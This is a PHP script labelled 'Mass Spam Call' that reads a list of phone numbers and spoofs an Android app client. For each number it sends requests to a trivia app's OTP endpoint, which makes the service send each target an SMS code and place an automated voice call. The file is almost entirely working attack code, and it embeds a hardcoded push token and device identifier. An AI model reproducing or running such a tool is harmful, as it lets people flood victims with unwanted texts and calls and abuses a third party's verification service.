<?php

function sms($target) {

$data = array("applicationInfo" => "ANDROID", "country" => "ID", "deviceModel" => "ASUS_X00AD", "locale" => "in_ID", "method" => "SMS", "networkCode" => "51001", "phoneNumber" => "$target", "udid" => "f0d2f0e4a35230410424e0c5f519361b019ef56924f690349dcbc7d32636ab31");

$post = json_encode($data);

$to = curl_init();

curl_setopt($to, CURLOPT_URL, "https://api.triviago.me/api/v1.0/auth/issuePin");

curl_setopt($to, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($to, CURLOPT_POST, 1);

curl_setopt($to, CURLOPT_POSTFIELDS, $post);

curl_setopt($to, CURLOPT_HEADER, 1);

curl_setopt($to, CURLOPT_HTTPHEADER, array("Content-Type: application/json; charset=UTF-8", "x-tgo-pushtoken: cozEbCf2_1I:APA91bG8srl00mwgEWAo8q20gzvkEABzuhn1pCcx8v3qsXX2mLaiLb26ImHLsn0cZ-GzMjQvX505HzacfyOCPuY97U6hIEugKDyfkblzvKFLEMaYej6aq1QNWNbxFg9sZuOiSjrUuCtR", "x-tgo-pushtype: GCM", "x-tgo-timezoneid: Asia/Jakarta", "x-tgo-serviceid: tgoid", "Accept-Language: in"));

curl_setopt($to, CURLOPT_USERAGENT, "tgo/1.1.2 Android/6.0.1 ASUS_X00AD");

$y = curl_exec($to);

curl_close($to);

}

function tlpn($target) {

$data = array("applicationInfo" => "ANDROID", "country" => "ID", "deviceModel" => "ASUS_X00AD", "locale" => "in_ID", "method" => "IVR", "networkCode" => "51001", "phoneNumber" => "$target", "udid" => "f0d2f0e4a35230410424e0c5f519361b019ef56924f690349dcbc7d32636ab31");

$post = json_encode($data);

$to = curl_init();

curl_setopt($to, CURLOPT_URL, "https://api.triviago.me/api/v1.0/auth/issuePin");

curl_setopt($to, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($to, CURLOPT_POST, 1);

curl_setopt($to, CURLOPT_POSTFIELDS, $post);

curl_setopt($to, CURLOPT_HEADER, 1);

curl_setopt($to, CURLOPT_HTTPHEADER, array("Content-Type: application/json; charset=UTF-8", "x-tgo-pushtoken: cozEbCf2_1I:APA91bG8srl00mwgEWAo8q20gzvkEABzuhn1pCcx8v3qsXX2mLaiLb26ImHLsn0cZ-GzMjQvX505HzacfyOCPuY97U6hIEugKDyfkblzvKFLEMaYej6aq1QNWNbxFg9sZuOiSjrUuCtR", "x-tgo-pushtype: GCM", "x-tgo-timezoneid: Asia/Jakarta", "x-tgo-serviceid: tgoid", "Accept-Language: in"));

curl_setopt($to, CURLOPT_USERAGENT, "tgo/1.1.2 Android/6.0.1 ASUS_X00AD");

$y = curl_exec($to);

curl_close($to);

echo "SUKSES MENELPON => $target\n";

}

$banner = "\e[36;1m                                                                                 

                                                                                 

           #         ######   

           #    #             

  ######   #    #  ########## 

           #    #  #        # 

           #######        ##  

##########      #       ##    

                #     ##      

                              

                                                                                 

[#] Mass Spam Call [#]    

                                   

Author : Revan AR                  

Team   : IndoSec                   

Github : https//github.com/revan-ar/\n\n\e[0;1m";

                                                                                 

                                                                                                                                                                 

sleep(3);

echo $banner;

sleep(2);

echo "masukan list target : ";

$file = trim(fgets(STDIN));

$get = file_get_contents($file);

$ex = explode("\n", $get);

echo "\n\nRESULT :\n";

foreach($ex as $target) {

sms($target);

tlpn($target);

}

?>
